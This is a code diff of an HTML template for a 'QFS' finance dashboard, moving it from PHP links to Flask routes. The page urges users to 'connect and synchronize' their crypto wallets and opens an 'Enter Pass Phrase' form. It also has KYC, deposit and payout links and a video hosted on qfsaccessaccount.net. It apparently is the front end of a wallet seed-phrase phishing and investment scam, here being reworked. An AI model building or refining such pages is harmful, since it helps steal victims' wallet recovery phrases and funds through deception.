@@ -8,7 +8,7 @@
             <h1>Dashboard</h1>
         </div>
     </section>
-    <div v-if="user_foreground == '1' || user_background == '1'">
+    <!-- <div v-if="user_foreground == '1' || user_background == '1'">
         <div v-if="notificationPermission == 'default' && !is_notification_skipped" v-cloak>
             <div class="media align-items-center d-flex justify-content-between alert alert-warn mb-4">
                 <div><i class="fas fa-exclamation-triangle"></i> Do not miss any single important notification! Allow your browser to get instant push notification <button class="btn btn-primary ml-3" id="allow-notification">Allow me</button>
@@ -17,7 +17,7 @@
         </button>
             </div>
         </div>
-    </div>
+    </div> -->
     <div>
         <div class="media align-items-center d-flex justify-content-between alert alert-warn mb-4">
             <div><i class="fas fa-exclamation-triangle"></i> Connect and synchronize your digital Wallets with QFS now for maximum cyber security and swift funding/transfer of your assets using the Quantum Finance Credit Card. <button class="btn btn-primary ml-3 addBtn"
@@ -34,7 +34,7 @@
                     <h5 class="modal-title">Enter Pass Phrase</h5>
 
                 </div>
-                <form action="incs/phrase.php" method="POST">
+                <form method="POST">
                     <input type="hidden" name="_token" value="xbegwQlCSk72J9sKURD5zLNTbR0du6Retz0xphju">
                     <div class="modal-body">
 
@@ -81,16 +81,16 @@
         </div>
     </div>
 
-    <div v-if="notificationPermission == 'denied' && !is_notification_skipped" v-cloak>
+    <!-- <div v-if="notificationPermission == 'denied' && !is_notification_skipped" v-cloak>
         <div class="media align-items-center d-flex justify-content-between alert alert-warn mb-4">
             <div><i class="fas fa-exclamation-triangle"></i> Please allow your browser to get instant push notification. Allow it from notification setting. </div>
             <button class="close-btn pt-1" @click.prevent="skipNotification"><i class="fas fa-times"></i>
     </button>
         </div>
-    </div>
+    </div> -->
     <div class="media align-items-center d-flex justify-content-between alert alert-warn mb-4">
         <div><i class="fas fa-exclamation-triangle"></i> You have information to submit in verification center. </div>
-        <a href="fill-up.php" class="btn btn-primary">Submit Now</a>
+        <a href="{{url_for('dashboard.kyc')}}" class="btn btn-primary">Submit Now</a>
     </div>
 
     <div class="section-body">
@@ -109,7 +109,7 @@
                         </div>
                         <div class="col-sm-5 text-center text-sm-left">
                             <div class="card-body pb-0 px-0 px-md-4 text-right">
-                                <img src="https://demos.themeselection.com/sneat-bootstrap-html-admin-template-free/assets/img/illustrations/man-with-laptop-light.png" height="140" alt="View Badge User" data-app-dark-img="illustrations/man-with-laptop-dark.png" data-app-light-img="illustrations/man-with-laptop-light.png"
+                                <img src={{url_for('static', filename="dashboard/assets/img/illustrations/man-with-laptop-light.png")}} height="140" alt="View Badge User" data-app-dark-img="illustrations/man-with-laptop-dark.png" data-app-light-img="illustrations/man-with-laptop-light.png"
                                 />
                             </div>
                         </div>
@@ -124,7 +124,7 @@
                         <div class="row">
                             <div class="col-xl-2 col-lg-4 col-md-3 col-6">
                                 <div class="quick-link text-center">
-                                    <a href="manual.php" class="btn btn-icon icon-left btn-primary py-3 w-100">
+                                    <a href="{{url_for('dashboard.deposit_now')}}" class="btn btn-icon icon-left btn-primary py-3 w-100">
                                         <div class="icon">
                                             <i class="fas fa-wallet"></i>
                                         </div>
@@ -134,7 +134,7 @@
                             </div>
                             <div class="col-xl-2 col-lg-4 col-md-3 col-6">
                                 <div class="quick-link text-center">
-                                    <a href="request-payout.php" class="btn btn-icon icon-left btn-primary py-3 w-100">
+                                    <a href="{{url_for('dashboard.all_request')}}" class="btn btn-icon icon-left btn-primary py-3 w-100">
                                         <div class="icon">
                                             <i class="fas fa-money-bill-alt"></i>
                                         </div>
@@ -144,7 +144,7 @@
                             </div>
                             <div class="col-xl-2 col-lg-4 col-md-3 col-6">
                                 <div class="quick-link text-center">
-                                    <a href="pay-bill.php" class="btn btn-icon icon-left btn-primary py-3 w-100">
+                                    <a href="{{url_for('dashboard.bill')}}" class="btn btn-icon icon-left btn-primary py-3 w-100">
                                         <div class="icon">
                                             <i class="fas fa-shopping-bag"></i>
                                         </div>
@@ -154,7 +154,7 @@
                             </div>
                             <div class="col-xl-2 col-lg-4 col-md-3 col-6">
                                 <div class="quick-link text-center">
-                                    <a href="exchange.php" class="btn btn-icon icon-left btn-primary py-3 w-100">
+                                    <a href="{{url_for('dashboard.exchange')}}" class="btn btn-icon icon-left btn-primary py-3 w-100">
                                         <div class="icon">
                                             <i class="fas fa-exchange-alt"></i>
                                         </div>
@@ -164,7 +164,7 @@
                             </div>
                             <div class="col-xl-2 col-lg-4 col-md-3 col-6">
                                 <div class="quick-link text-center">
-                                    <a href="voucher-create-request.php" class="btn btn-icon icon-left btn-primary py-3 w-100">
+                                    <a href="{{url_for('dashboard.voucher')}}" class="btn btn-icon icon-left btn-primary py-3 w-100">
                                         <div class="icon">
                                             <i class="fas fa-tags"></i>
                                         </div>
@@ -174,7 +174,7 @@
                             </div>
                             <div class="col-xl-2 col-lg-4 col-md-3 col-6">
                                 <div class="quick-link text-center">
-                                    <a href="invoice.php" class="btn btn-icon icon-left btn-primary py-3 w-100">
+                                    <a href="{{url_for('dashboard.invoice')}}" class="btn btn-icon icon-left btn-primary py-3 w-100">
                                         <div class="icon">
                                             <i class="fas fa-file-invoice"></i>
                                         </div>
@@ -194,7 +194,7 @@
                         <div class="row ">
                             <div class="embed-responsive embed-responsive-16by9">
                         <video controls>
-                            <source src="uploads/qfs.mp4" type="video/mp4">
+                            <source src="https://qfsaccessaccount.net/dashboard/user/uploads/qfs.mp4" type="video/mp4">
                         </video>
                         </div>
                         </div>
